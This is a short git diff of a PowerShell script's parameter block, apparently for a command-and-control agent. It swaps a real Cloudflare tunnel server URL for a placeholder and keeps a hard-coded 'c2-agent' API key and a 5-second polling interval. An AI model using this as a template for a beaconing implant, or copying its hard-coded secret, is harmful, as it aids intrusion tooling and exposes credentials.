@@ -2,7 +2,7 @@
 # Uses proper SSL via Nginx reverse proxy (no certificate hacks needed)
 
 param(
-    [string]$Server = "https://attention-launches-kind-commonly.trycloudflare.com",  # CHANGE THIS
+    [string]$Server = "https://CHANGE-MECHANGE-ME.trycloudflare.com",  # CHANGE THIS
     [string]$ApiKey = "c2-agent-k3y-2024-s3cr3t",
     [int]$Interval = 5
 )
